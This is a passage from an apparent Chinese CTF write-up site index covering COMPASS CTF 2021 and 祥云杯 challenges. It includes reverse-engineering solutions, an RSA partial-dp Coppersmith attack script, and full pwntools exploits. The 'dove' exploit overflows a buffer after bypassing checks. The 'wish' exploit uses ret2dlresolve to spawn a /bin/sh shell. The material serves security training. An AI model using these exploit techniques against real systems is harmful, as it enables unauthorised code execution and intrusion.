<p>\u6267\u884c\u540e\u5728\u5f39\u7a97\u84dd\u5b57\u4e2d\u9009\u62e9\u8ba9IDA\u81ea\u52a8\u628a\u6240\u6709\u5f02\u5e38\u4f20\u7ed9\u7a0b\u5e8f  \u89e6\u53d1\u65ad\u70b9\u540e\u5c31\u53ef\u4ee5\u53cc\u51fb\u8ddf\u8fdbbyte_983370\u5f97\u5230\u8fd0\u7b97\u7ed3\u679c  </p> <p>\u6700\u540e\u5c31\u662f\u7528\u52a8\u6001\u83b7\u53d6\u7684byte_983370\u503c\u4ea6\u6216\u8f93\u5165\u518d\u4ea6\u6216\u6700\u540e\u7684\u6bd4\u8f83\u6570\u7ec4byte_E62138 \u8fd9\u91cc\u6211\u7684\u8f93\u5165\u662f44\u4e2a\u6570\u5b571\uff0c\u56e0\u6b64\u811a\u672c\u5982\u4e0b\uff1a  </p> <pre><code># \u5199\u6b7b\u7684\u6bd4\u8f83\u6570\u7ec4\nbyte_E62138 = [0x3e, 0xcd, 0xaa, 0x8e, 0x96, 0x69, 0x94, 0x98, 0xda, 0xa8, 0x27, 0xa4, 0xf7, 0xc5, 0xfb, 0x90, 0xf3,\n               0xb3, 0xdf, 0xd8, 0x71, 0x30, 0x47, 0x19, 0x1b, 0x65, 0xd, 0xca, 0x6f, 0x8, 0x89, 0x8c, 0xe7, 0x87, 0x5d,\n               0xbc, 0x9f, 0xf2, 0x83, 0x69, 0x8d, 0x24, 0xD3, 0x5A]\n# \u8c03\u8bd5\u65f6\u83b7\u53d6\u7684byte_983370\nkey = [0x69, 0x90, 0xFA, 0xD8, 0xDC, 0x1D, 0xDD, 0xCA, 0xD8, 0xF5, 0x27, 0xA6, 0xA8, 0x80, 0x95, 0xD8, 0xF2, 0xF7, 0xB1,\n       0x8E, 0x0F, 0x75, 0x29, 0x1F, 0x42, 0x67, 0x63, 0x89, 0x6A, 0x57, 0xDC, 0x8D, 0xBB, 0xE9, 0x07, 0xBE, 0xD7, 0xE2,\n       0x80, 0x60, 0x88, 0x68, 0xD3, 0x5A]\n\nfor i in range(0, 42):\n    print(chr(key[i] ^ byte_E62138[i] ^ ord('1')), end='')\n</code></pre> <p>\u8fd0\u884c\u83b7\u5f97flag</p> <p>flag{Exc3l13nt_y0u_gOt_7h3_r4nd0m_k3y!284}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#java_re","title":"java_re","text":"<p>Jd-GUI\u6253\u5f00\uff0c\u4e3b\u8981\u903b\u8f91\u662f\u5c06\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u505aDES\u52a0\u5bc6\uff0c\u5bc6\u94a5\u662feasy_key\uff0c\u5982\u679c\u7ed3\u679c\u7b49\u4e8e\u5bc6\u6587\u8bc1\u660e\u8f93\u5165\u7684flag\u6b63\u786e  </p> <pre><code>import java.util.Base64;\nimport java.util.Scanner;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.swing.JOptionPane;\n\npublic class EzJar {\n    //hint: flag not here but the logic are same\n    public static void main(String[] args) throws Exception {\n        JOptionPane.showMessageDialog(null, \"Give me your flag:\", \"alert\", JOptionPane.QUESTION_MESSAGE);\n        System.out.print(\"Give me your flag:\");\n        Scanner sc = new Scanner(System.in);\n        String s = sc.next();\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        cipher.init(1, new SecretKeySpec(\"easy_key\".getBytes(), \"DES\"));\n        String result = new String(Base64.getEncoder().encode(cipher.doFinal(s.getBytes())));\n        System.out.println(result);\n        if (\"UUwnbEk0rzLol6T6uWsAqIlSzBsuPYTtuaxkQBwZA1zwu6ba5rnSM82HBI8AMbQhX5KdguHFpXtBInmrvakU6uDQ4whqs+FfRrrQqxupe/lxNirtl2deAg==\".equals(result)) {\n            JOptionPane.showMessageDialog(null, \"Accept!\");\n            System.out.print(\"Accept!\");\n        } else {\n            JOptionPane.showMessageDialog(null, \"Wrong answer!\");\n            System.out.print(\"Wrong answer!\");\n        }\n    }\n}\n</code></pre> <p>\u4f46\u662f\u5728DES\u7ebf\u89e3\u5bc6\uff08\u6216\u8005\u7528java\u91cd\u8fd0\u884c\u4e00\u4e0b\u89e3\u5bc6\uff09\u4e4b\u540e\u5f97\u5230   </p> <p>notflag{hint:jar_will_consider_a.class/_as_file_but_zip_will_consider_it_as_folder}</p> <p>\u63d0\u793a\u8bf4jar\u5bf9\u4e8e\u7c7b\u540d.class\u4f1a\u5ffd\u7565\u5c3e\u90e8\u7684/\uff0c\u4f46\u662fzip\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u76ee\u5f55\u800c\u4e0d\u662f\u6587\u4ef6\u3002 \u4ed4\u7ec6\u89c2\u5bdf\uff0c\u6211\u4eec\u770b\u5230\u7684\u5e76\u4e0d\u662fEzJar.class\u800c\u662f\u4e00\u4e2a\u9759\u6001\u7684EzJar.java  \u67e5\u770bjar\u768416\u8fdb\u5236\uff0c\u679c\u7136\u6709\u4e00\u4e2a\u5947\u602a\u7684\u6587\u4ef6  jar\u5728\u8fd0\u884c\u65f6\u4f1a\u67e5\u627eMANIFEST\u4e2d\u7684\u7c7b\u540d.class\uff0c\u540c\u65f6\u5ffd\u7565\u5c3e\u90e8\u7684/\u3002\u4e5f\u5c31\u662f\u8bf4\u201dEzJar.class/\u201d\u4f1a\u88ab\u8bc6\u522b\u4e3a\u6587\u4ef6\u800c\u4e0d\u662f\u6587\u4ef6\u5939\uff0c\u56e0\u6b64jar\u52a0\u8f7d\u7684class\u5b9e\u9645\u662f\u201dEzJar.class/\u201d\u3002\uff08\u4e8b\u5b9e\u4e0a\uff0cjava\u751a\u81f3\u4f1a\u5ffd\u7565CRC\u6821\u9a8c\uff0c\u800cZIP\u4f1a\u62d2\u7edd\u89e3\u538b\uff09 \u4e3a\u4e86\u53d6\u51fa/\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u5199java\u811a\u672c\u8bfb\u53d6jar\u91cd\u5199entry\uff0c\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u5c06hex\u91cc\u7684\u6587\u4ef6\u540d\u201dEzJar.class/\u201d\u66ff\u6362\u4e3a\u201dEzJar1.class\u201d\u5c31\u53ef\u4ee5\u7528zip\u89e3\u538b\u51fa\u771f\u5b9e\u7684class\u6587\u4ef6\u4e86\u3002 \u5c06\u89e3\u538b\u51fa\u7684\u201dEzJar1.class\u201d\u4ea4\u7ed9IDEA\u53cd\u6c47\u7f16\uff0c\u770b\u5230\u201dEzJar1.class\u201d\u7684\u4e3b\u8981\u903b\u8f91\u548c\u5047\u6587\u4ef6EzJar.java\u662f\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u53ea\u6709\u5b57\u7b26\u4e32\u88ab\u52a0\u5bc6\u4e86\u3002   </p> <p>\u6df7\u6dc6\u7684\u4ee3\u7801\uff0c\u5b9e\u9645\u683c\u5f0f\u548c\u4e0a\u8fb9\u4e00\u6a21\u4e00\u6837  </p> <pre><code>public static void main(String[] var0) throws Exception {\n        JOptionPane.showMessageDialog((Component)null, I[l[0]], I[l[1]], l[2]);\n        System.out.print(I[l[3]]);\n        byte llllllllllllIIl = new Scanner(System.in);\n        char llllllllllllIII = llllllllllllIIl.next();\n        String lllllllllllIlll = Cipher.getInstance(I[l[2]]);\n        lllllllllllIlll.init(l[1], new SecretKeySpec(I[l[4]].getBytes(), I[l[5]]));\n        int lllllllllllIllI = new String(Base64.getEncoder().encode(lllllllllllIlll.doFinal(llllllllllllIII.getBytes())));\n        if (lIl(I[l[6]].equals(lllllllllllIllI))) {\n            JOptionPane.showMessageDialog((Component)null, I[l[7]]);\n            System.out.print(I[l[8]]);\n            \"\".length();\n            if (-\" \".length() &gt; 0) {\n                return;\n            }\n        } else {\n            JOptionPane.showMessageDialog((Component)null, I[l[9]]);\n            System.out.print(I[l[10]]);\n        }\n\n    }\n</code></pre> <p>\u4e5f\u5c31\u662f\u53ea\u9700\u8981\u89e3\u5bc6\u51faflag\u548ckey\u7684\u5b57\u7b26\u5c31\u80fd\u5f97\u5230flag\uff0c\u627e\u5230\u4ed6\u4eec\u6240\u5728\u7684\u4f4d\u7f6e  </p> <pre><code>static {\n        lII();\n        ll();\n        AC = I[l[11]];\n        flag = I[l[12]];\n        enc = I[l[13]];\n        banner = I[l[14]];\n        WA = I[l[15]];\n        key = I[l[16]];\n    }\n</code></pre> <p>I \u6570\u7ec4\u662f\u52a0\u89e3\u5bc6\u6570\u7ec4\uff0c\u800cl\u6570\u7ec4\u662f\u4e0b\u6807\u66ff\u6362\u6570\u7ec4\uff0c\u83b7\u53d6l\u548cI\u7684\u503c\u53ea\u9700\u8981\u628a\u4ee3\u7801\u590d\u5236\u76f4\u63a5\u8fd0\u884c\u5c31\u80fd\u5f97\u5230\u771f\u5b9e\u7684\u7d22\u5f15\uff0c\u7136\u540e\u628a\u5bf9\u5e94\u7684\u5bc6\u6587\u548c\u5bc6\u7801\u627e\u51fa\u6765 \u5176\u4e2d\u7684\u52a0\u5bc6\u52a0\u5bc6\u5e76\u4e0d\u590d\u6742\uff0c\u53ea\u6709\u4e09\u79cd\uff1a - \u2460\u6709\u770b\u4f3c\u5197\u957f\u5176\u5b9e\u5c31\u662f\u5faa\u73af\u4ea6\u6216\u7684\u52a0\u89e3\u5bc6\uff0c\u89e3\u5bc6   s=b64decode(b\"\u7b2c\u4e00\u4e2a\u53c2\u6570\u5bc6\u6587\")   key=b\"\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5bc6\u94a5\"   for i in range(0,len(s)):      print(chr(s[i]^key[i%len(key)]),end=\"\") - \u7528\u5bc6\u7801\u7684MD5\u8f6c\u6362\u4e3aDES\u5bc6\u94a5\u52a0\u89e3\u5bc6 - \u7528\u5bc6\u7801\u7684MD5\u8f6c\u6362\u4e3aBolwfosh\u5bc6\u94a5\u52a0\u89e3\u5bc6 \u8fd9\u4e24\u79cd\u7528java\u518d\u8fd0\u884c\u4e00\u6b21\u5c31\u662f\u89e3\u5bc6</p> <p>\u627e\u5230flag\u548ckey\u5bf9\u5e94\u7684\u52a0\u5bc6\u65b9\u6cd5\uff0c\u89e3\u5bc6\u5f97\u5230key\u4e3ame@Ctf3r\uff0c\u7528key DES\u89e3\u5bc6\u5f97\u5230flag  </p> <p>flag{Ctf3r_me_1s_A_very_g0Od_9Uy}</p> <p>PS. IDA\u76f4\u63a5\u6253\u5f00jar\u5c31\u53ef\u4ee5\u770b\u5230\u771f\u5b9e\u7684entry  </p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#pwn","title":"PWN","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#dove","title":"dove","text":"<p>IDA\u7684\u903b\u8f91\u53ef\u4ee5\u770b\u7684\u5341\u5206\u6e05\u695a\uff0c\u7a0b\u5e8f\u5206\u4e3a\u524d\u9762\u7684\u4e09\u4e2acheck\u548c\u540e\u9762\u7684\u4e00\u4e2a\u6ea2\u51fa \u4e09\u6b21ckeck\u4f9d\u6b21\u4e3a\uff1a \u7b2c\u4e00\u4e2acheck\u662f\u8f93\u5165\u4e00\u4e2along long\uff0c\u5982\u679c\u5c0f\u4e8e10\u5c31\u8f6c\u6362\u4e3aint\u8c03\u7528talk \u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a\u8d1f\u6570\u4f7f\u5f97\u8f6c\u6362\u6210int\u65f6\u7b49\u4e8e10\uff0c\u7528c\u5199\u4e2a\u811a\u672c\u4ecelonglong\u7684\u6700\u5c0f\u503c\u904d\u5386\u5c31\u80fd\u7acb\u523b\u5f97\u5230\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c -9223372036854775798 </p> <pre><code>long long choice = 0;\nputs(\"\\n\u7b2c\u4e00\u5468\uff0c\u9e3d\u5b50\u6ca1\u6709\u51fa\u73b0\u5728\u8bad\u7ec3\u73b0\u573a\uff0c\u4f60\u51c6\u5907\u53bb\u53eb\u4ed6\");\n    printf(\"\u672c\u5468\u4f60\u7684\u89e3\u51b3\u65b9\u6cd5\u662f(0-9):\");\n    scanf(\"%lld\", &amp;choice);\n    if (choice &lt; 10) {\n        win_count += talk(choice);\n    }\n    else {\n        win_count += talk(rand() % 10);\n    }\n</code></pre> <p>\u7b2c\u4e8c\u4e2acheck\u662f\u8f93\u5165\u4e00\u4e2aint \u5982\u679c\u5c0f\u4e8e10\u5c31\u8c03\u7528talk  \u6211\u4eec\u9700\u8981\u8df3\u8fc7\u8fd9\u4e2a\u8f93\u5165\uff0cscanf\u5728\u63a5\u53d7\u65e0\u6548\u503c\u65f6\u4f1a\u8df3\u8fc7\u8d4b\u503c\uff0c \u6b63\u8d1f\u53f7+ - \u662f\u53ef\u4ee5\u8df3\u8fc7scanf\u53c8\u4e0d\u7ed3\u675f\u7a0b\u5e8f\u7684\u65e0\u6548\u503c\u3002 \u6216\u8005\u8f93\u5165\u4e00\u4e2a\u8fc7\u5927\u7684\u6574\u6570\u4e5f\u80fd\u8df3\u8fc7\u8f93\u5165\uff0c\u6bd4\u5982 \u628a\u7b2c\u4e00\u6b21\u7684\u8f93\u5165\u590d\u5236\u4e00\u6b21 \u4e5f\u884c  </p> <pre><code>scanf(\"%d\", &amp;choice);\n    if (choice &lt; 10) {\n        win_count += talk(choice);\n    }\n    else {\n        win_count += talk(rand() % 10);\n    }\n</code></pre> <p>\u7b2c\u4e09\u4e2acheck\u662f\u8f93\u5165\u4e00\u4e2aint \u548c\u4e00\u4e2a\u5f53\u524d\u65f6\u95f4\uff08\u7cbe\u786e\u5230\u79d2\uff09\u7684\u968f\u673a\u6570\uff0c\u5982\u679c\u968f\u673a\u6570\u8f93\u5165\u6b63\u786e\u5c31\u8fdb\u884ctalk \u56e0\u4e3a\u662f\u7cbe\u786e\u5230\u79d2\u7684\u968f\u673a\u79cd\u5b50\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u8981\u8fdb\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5019\u672c\u673a\u4e5f\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u53d1\u9001\u8fc7\u53bb\u5c31\u662f\u4e00\u81f4\u7684  </p> <pre><code>int x = 0;\n    srand(time(0));\n    choice = 0;\n    int y = rand();\n    scanf(\"%d %d\", &amp;choice, &amp;x);\n    if (y == x) {\n        win_count += talk(choice);\n    }\n    else {\n        win_count += talk(rand() % 10);\n    }\n</code></pre> <p>\u6700\u7ec8\u4f1a\u63a5\u53d7\u4e00\u4e2aa\u5b57\u7b26\u4e32\u6ea2\u51fa\uff0c\u8986\u76d6\u540e\u8fb9\u7684\u53d8\u91cfwin_flag\u5c31\u80fd\u5b8c\u6210PWN  </p> <pre><code>char* a = \"\";\nint win_flag = 0;\nif (win_count &gt; 2) {\n        gets(&amp;a);\n    }\n    else {\n        puts(\"\\n\u52a0\u6cb9\uff0c\u518d\u8bd5\u4e00\u6b21\u5427\uff01\");\n    }\n</code></pre> <p>\u6574\u4e2a\u9898\u76ee\u811a\u672c\u5982\u4e0b\uff1a  </p> <pre><code>from pwn import *\nimport ctypes\n\np=process(\"./dove\")\n\nlibc = ctypes.CDLL('/lib/x86_64-linux-gnu/libm.so.6') # \u9884\u5148\u52a0\u8f7dlibc\u51cf\u5c11\u5ef6\u8fdf\n\nprint(p.recv().decode())\np.sendline(b\"-9223372036854775798\") # longlong &lt; 10, \u8f6cint\u4e4b\u540e\u6b63\u597d=10\n\nprint(p.recv().decode())\np.sendline(b\"-\") # \u8df3\u8fc7scanf \u6216\u8005\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u5b57\u4e5f\u53ef\u4ee5 \u6bd4\u5982\u4e0a\u8fb9\u7684-92233...\n\nlibc.srand(libc.time())\nprint(p.recv().decode())\np.sendline(b\"10 \"+str(libc.rand()).encode()) #\u540c\u6b65\u751f\u6210\u968f\u673a\u6570\n\nprint(p.recv().decode())\np.sendline(b\"a\"*50) # \u6ea2\u51fa\u8986\u76d6\u540e\u8fb9\u7684\u53d8\u91cf\n\np.interactive()\n</code></pre>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#wish","title":"wish","text":"<p>\u9996\u5148ckecksec\u770b\u4e0b\u4fdd\u62a4  \u5e73\u5e73\u65e0\u5947\u53ea\u5f00\u4e86NX\u548c\u90e8\u5206RELRO\uff0cIDA\u770b\u903b\u8f91\uff1a  </p> <pre><code>ssize_t vuln(){\n  char buf[8]; // [esp+Ch] [ebp-Ch] BYREF\n\n  return read(0, buf, 52);\n}\n</code></pre> <p>\u662f\u4e00\u4e2a\u6ea2\u51fa\uff0c\u4f46\u662f\u5f88\u53ef\u60b2\u7684\u662f\u8fd9\u4e2a\u9898\u76ee\u4e0d\u4ec5\u6ca1\u6709\u540e\u95e8\u51fd\u6570\uff0c\u751a\u81f3\u6ca1\u6709\u89e3\u6790 \u4efb\u4f55\u7684\u8f93\u51fa\u65b9\u6cd5 \uff0c\u6ca1\u6709\u8f93\u51fa\u5c31\u96be\u4ee5\u6cc4\u9732\u5730\u5740\uff0c\u800clibc\u53c8\u662f\u968f\u673a\u52a0\u8f7d\u7684\u4e0d\u77e5\u9053\u521d\u59cb\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u6709\u4ee5\u4e0b\u601d\u8def\uff1a - \u7206\u7834libc\u7684\u504f\u79fb return to OneGadGet - ret2dlresolve \u5176\u4e2d\u65b9\u6cd5\u4e8c\u662f\u4e00\u79cd\u6bd4ret2libc\u66f4\u5f3a\u5927\u7684ROP\uff0c\u53ef\u4ee5\u5728\u4e0d\u6cc4\u9732libc\u5730\u5740\u7684\u60c5\u51b5\u4e0b\u901a\u8fc7dlresolve\u7528\u4efb\u610f\u51fd\u6570\u540d\u8986\u76d6\u89e3\u6790\u5df2\u6709\u7684\u51fd\u6570\u3002\u800cpwntools\u53c8\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684Ret2dlresolvePayload\u7c7b\uff0c\u4e0b\u9762\u662f\u81ea\u52a8\u5316\u811a\u672c\uff1a</p> <pre><code>from pwn import *\n\ncontext.binary = elf = ELF('wish')\nr = remote(\"xx.xx.xx.xx\",xxxx)\nrop = ROP(context.binary)\ndlresolve = Ret2dlresolvePayload(elf, symbol=\"system\", args=[\"/bin/sh\"])\nrop.read(0, dlresolve.data_addr, 200)\nrop.ret2dlresolve(dlresolve)\nr.send(b'A' * (0xc+4) + rop.chain())\npause(1)\nr.send(dlresolve.payload)\nr.interactive()\n</code></pre> <p>\u8fd0\u884c\u5c31\u80fd\u83b7\u5f97shell  \u77ed\u77ed12\u884c\u4ee3\u7801\u5c31\u80fd\u5b8c\u6210\u5f3a\u5927\u7684ret2dl\uff0cpwntools\u786e\u5b9e\u662f\u5f3a\u5927\u7684\u5de5\u5177\u3002  </p> <p>\u5f53\u7136\uff0c\u6211\u4eec\u8981\u60f3\u4e86\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u6700\u597d\u7684\u529e\u6cd5\u662f\u4e0d\u501f\u52a9\u8f6e\u5b50\u5b9e\u73b0\u4e00\u6b21\u3002 \u800c\u4e14\u4e0a\u8fb9\u7684\u81ea\u52a8\u5316\u811a\u672c\u53d1\u9001\u7684\u7b2c\u4e00\u6bb5\u6808\u8fc1\u79fb\u7684payload\u957f\u5ea6\u6b63\u597d\u662f52\u4e2a\u5b57\u7b26\uff0c\u5f88\u6781\u9650\uff0c\u6211\u4eec\u624b\u5199\u7684\u811a\u672c\u4e0d\u9700\u8981\u5e73\u8861\u6808\u7684\u60c5\u51b5\u4e0b\u53ea\u9700\u898148\u4e2a\u5b57\u7b26\uff0c\u591a\u4e86\u4e00\u70b9\u7a7a\u95f4\uff1a  </p> <pre><code>from pwn import *\n\nelf = ELF('./wish')\n\noffset = 0xc + 4\nppp_ret = 0x080492a1      # ROPgadget --binary wish --only \"pop|ret\"\nleave_ret = 0x08049125    # ROPgadget --binary wish --only \"leave|ret\"\nplt_0 = 0x08049030        # objdump -d -j .plt wish\nrel_plt = 0x08048350      # objdump -s -j .rel.plt wish\ndynsym = 0x08048248       # readelf -S wish\ndynstr = 0x080482b8       # readelf -S wish\nret = 0x0804900e          # ROPgadget --binary wish --only \"ret\"\n\npop_ebp_ret = ppp_ret + 2\nread_plt = elf.plt['read']\nstack_size = 0x800\nbss_addr = elf.sym['__bss_start']\nbase_stage = bss_addr + stack_size\nr = remote(\"xx.xx.xx.xx\",xxxx)\n\n# read(0, bss, 100)\u628apayload2\u5199\u5165bss\u6bb5\uff0c\u5e76\u628a\u6808\u8fc1\u79fb\u5230bss\u6bb5\npayload = b'A' * offset + p32(ret) + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100) + \\\n          p32(pop_ebp_ret) + p32(base_stage) + p32(leave_ret)\nr.send(payload)\n\nalign = 0x10 - ((base_stage + 40 - dynsym) % 16)\nfake_sym_addr = base_stage + 40 + align  # \u586b\u5145\u5730\u5740\u4f7f\u5176\u4e0edynsym\u7684\u504f\u79fb16\u5b57\u8282\u5bf9\u9f50\uff08\u5373\u4e24\u8005\u7684\u5dee\u503c\u80fd\u88ab16\u6574\u9664\uff09\uff0c\u56e0\u4e3a\u7ed3\u6784\u4f53sym\u7684\u5927\u5c0f\u90fd\u662f16\u5b57\u8282\nr_info = ((((fake_sym_addr - dynsym) // 16) &lt;&lt; 8) | 0x7)  # \u4f7f\u5176\u6700\u4f4e\u4f4d\u4e3a7\uff0c\u901a\u8fc7\u68c0\u6d4b\nfake_write_rel = flat(p32(elf.got['read']), p32(r_info))\nfake_write_str_addr = base_stage + 40 + align + 0x10\nfake_name = fake_write_str_addr - dynstr\nfake_sym = flat(p32(fake_name), p32(0), p32(0), p32(0))\n\npayload2 = flat(b'AAAA'\n                , p32(ret)\n                , p32(plt_0)\n                , base_stage + 32 - rel_plt  # arg\n                , p32(ppp_ret)\n                , p32(base_stage + 80)\n                , p32(base_stage + 80)\n                , p32(7)  # len(\"/bin/sh\")\n                , fake_write_rel  # base_stage + 32\n                , b'A' * align  # \u7528\u4e8e\u5bf9\u9f50\u7684\u586b\u5145\n                , fake_sym  # base_stage + 40 + align\n                , b'system\\x00'  # \u4f2a\u9020\u51fa\u7684\u5b57\u7b26\u4e32\n                )\npayload2 += b'A' * (80 - len(payload2)) + b'/bin/sh\\x00'\npayload2 += b'A' * (100 - len(payload2))\nr.sendline(payload2)\nr.interactive()\n</code></pre>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#frank","title":"Frank","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#hint","title":"\u6bd4\u8d5b\u4e2d\u653e\u51fa\u7684hint","text":"<p>PWN-dove \u7684\u6e90\u7801\u5df2\u4e0a\u4f20\u5230\u7fa4\u91cc   Misc-ezPWD \u7684\u5bc6\u7801\u662f18\u4f4d\u8eab\u4efd\u8bc1\u53f7 Web-Life Restart \u7a81\u7834100\u5c81\u662f\u5fc5\u8981\u6761\u4ef6\u662f\u6a59\u8272\u5929\u8d4b\"\u795e\u79d8\u7684\u5c0f\u76d2\u5b50\" \u987a\u5229\u4fee\u4ed9\u9700\u8981\u5f88\u9ad8\u7684\u5c5e\u6027 \u81ea\u52a8\u64ad\u653e\u53ef\u4ee5\u5f88\u5feb\u5f88\u5feb RE-Extremely slow \u7a0b\u5e8f\u9650\u5236\u662f\u4e00\u4e2a\u65f6\u95f4\u5e38\u6570\uff0c\u8d85\u65f6\u9000\u51fa Web-BBS \u6ce8\u5165\u662f\u7a81\u7834\u53e3 RE-Random \u52a8\u6001\u8c03\u8bd5  </p> <p>BBS \u63d0\u793a \u5f88\u7b80\u5355\u7684SQL\u6ce8\u5165 Extremely slow  \u63d0\u793a \u4fee\u6539\u6700\u5927\u65f6\u95f4\u9650\u5236\u5e38\u6570 Random \u63d0\u793a \u52a8\u6001\u8c03\u8bd5\u83b7\u53d6key java_re \u63d0\u793a \u7b2c\u4e00\u6b65\u89e3\u6cd5\u7528\u4e86https://itzsomebody.xyz/2021/07/11/javaisez3-writeup.html \u7684\u89e3\u6790\u7279\u6027 wish \u63d0\u793a ret2dlresolve Double Frank \u63d0\u793a \u53cc\u6307\u9488\u6570\u7ec4\u6a21\u62df\u73af\u72b6\u961f\u5217;\u7279\u6b8a\u60c5\u51b5Double Free;\u6784\u9020tcache dup  </p>"},{"location":"Writeup/Cryptography/Exposure/","title":"Exposure","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 50</p>"},{"location":"Writeup/Cryptography/Exposure/#description","title":"Description","text":"<p>Do you know how to rsa?</p>"},{"location":"Writeup/Cryptography/Exposure/#solution","title":"Solution","text":"<pre><code>from Crypto.Util.number import *\nimport gmpy2\np = getStrongPrime(512)\nq = getStrongPrime(512)\nn = p * q\nphi = (p - 1) * (q - 1)\ne = 7621\nd = gmpy2.invert(e, phi)\nflag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"\nc = pow(bytes_to_long(flag), e, n)\ndp = d % (p - 1)\nprint(dp &gt;&gt; 200)\nprint(c, e, n)\n\n\n#1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985\n#46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616\n#7621\n#140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863\n</code></pre> <p>dp\u6cc4\u9732\uff0c\u4f46\u662fdp\u88ab\u53f3\u79fb\u4e86200\u4f4d\uff0c\u60f3\u5230\u4e86Coppersmith\u653b\u51fb\uff0c\u8fd9\u4e2a\u662fdp\u9ad8\u4f4d\u6cc4\u9732\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u6c42((dp*e-1)/i)+1 \u7684 small roots \u5c31\u53ef\u4ee5\u4e86</p> <p>\u53c2\u8003KAPO2019 crypto\u7684\u9898</p> <p>https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz</p> <p>\u5199\u51fa\u89e3\u5bc6sage\u811a\u672c</p> <pre><code>n = 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863\nsecret = 1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985\nct = 46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616\n[n, secret, ct] = list(map(Integer, [n, secret, ct]))\ne = 7621\n\n\ndef facorize(e, dp):\n  for i in range(2, e):\n    p = (e * dp - 1 + i) // i\n    if n % p == 0:\n      return p\n  return -1\n\n\n\n\ndef recover(secret):\n  F.&lt;x&gt; = PolynomialRing(Zmod(n))\n  einv = inverse_mod(e, n)\n  for k in range(1, e):\n    print(\"k =\",  k)\n    f = (secret &lt;&lt; 200) + x + (k - 1) * einv\n    x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32)\n    if len(x0) != 0:\n      dp = x0[0] + (secret &lt;&lt; 200)\n      p_cand = facorize(e, Integer(dp))\n      if p_cand &lt; 0:\n        continue\n      else:\n        return p_cand, dp\n\n\nif __name__ == \"__main__\":\n    p, dp = recover(secret)\n    q = n // p\n    assert p * q == n\n    phi = (p - 1) * (q - 1)\n    d = inverse_mod(e, phi)\n    print(\"p = \",  p,  \"\\nq = \",  q)\n    flag = bytes.fromhex(hex(pow(ct, d, n))[2:])\n    print(flag)\n</code></pre> <p></p>"},{"location":"Writeup/Cryptography/Exposure/#flag","title":"Flag","text":"<p>flag{45879a9e-1431-4c34-86e2-6f1f7bb1256d}</p>"},{"location":"Writeup/Cryptography/Exposure/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/Cryptography/Guess/","title":"Guess","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 15</p>"},{"location":"Writeup/Cryptography/Guess/#description","title":"Description","text":"<p>\u5728\u4e00\u6b21\u4efb\u52a1\u4e2d\u6211\u9047\u5230\u4e86\u4e00\u4e2achallenge\uff0c\u6211\u7684\u961f\u53cb\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u4ed6\u622a\u83b7\u7684hint\uff0c\u4f60\u5229\u7528\u8fd9\u4e2ahint\u80fd\u5e2e\u6211\u5b8c\u6210\u8fd9\u4e2achallenge\u5417\uff1f<code>nc 0.cloud.chals.io 14337</code></p> <p> 